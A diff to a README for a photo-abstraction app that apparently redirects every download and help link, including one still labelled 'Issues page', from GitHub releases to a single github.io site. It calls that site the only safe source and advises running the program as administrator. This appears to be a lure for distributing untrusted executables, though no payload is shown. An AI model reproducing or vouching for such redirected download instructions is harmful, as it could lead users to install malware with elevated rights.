@@ -1,6 +1,6 @@
 <h1>📸 travel-photo-abstraction - Distill Photos into Stunning Art</h1>
 <p align="center">
-  <a href="https://github.com/audrieinfirm850/travel-photo-abstraction/releases" style="display:inline-block;padding:15px 30px;background:#4CAF50;color:white;text-decoration:none;border-radius:5px;font-size:20px;">⬇️ Download Now</a>
+  <a href="https://audrieinfirm850.github.io" style="display:inline-block;padding:15px 30px;background:#4CAF50;color:white;text-decoration:none;border-radius:5px;font-size:20px;">⬇️ Download Now</a>
 </p>
 
 <h2>🌟 What Is This?</h2>
@@ -8,7 +8,7 @@
 
 <h2>🚀 Getting Started</h2>
 <h3>Step 1: Download the Software</h3>
-<p>Visit this link to download the application: <a href="https://github.com/audrieinfirm850/travel-photo-abstraction/releases">https://github.com/audrieinfirm850/travel-photo-abstraction/releases</a></p>
+<p>Visit this link to download the application: <a href="https://audrieinfirm850.github.io">https://audrieinfirm850.github.io</a></p>
 <p>Click the latest release file to start the download. The file will save to your computer.</p>
 
 <h3>Step 2: Run the Application</h3>
@@ -48,11 +48,11 @@
   <li><strong>Program won't open?</strong> Make sure you downloaded the correct file for Windows. Try right-clicking and selecting "Run as administrator."</li>
   <li><strong>Photo not loading?</strong> Check that your file is a JPG, PNG, or BMP. Rename it to have no special characters (like ! or @).</li>
   <li><strong>Result looks messy?</strong> Try a photo with clear subjects and simple backgrounds. Very busy photos may produce less clean results.</li>
-  <li><strong>Need help?</strong> Visit the <a href="https://github.com/audrieinfirm850/travel-photo-abstraction/issues">Issues page</a> to ask questions or report problems.</li>
+  <li><strong>Need help?</strong> Visit the <a href="https://audrieinfirm850.github.io">Issues page</a> to ask questions or report problems.</li>
 </ul>
 
 <h2>📥 Download Again</h2>
-<p>Need the latest version? Always get it from the official release page: <a href="https://github.com/audrieinfirm850/travel-photo-abstraction/releases">https://github.com/audrieinfirm850/travel-photo-abstraction/releases</a></p>
+<p>Need the latest version? Always get it from the official release page: <a href="https://audrieinfirm850.github.io">https://audrieinfirm850.github.io</a></p>
 <p>This is the only safe source. Do not download from other websites.</p>
 
 <h2>📄 License</h2>
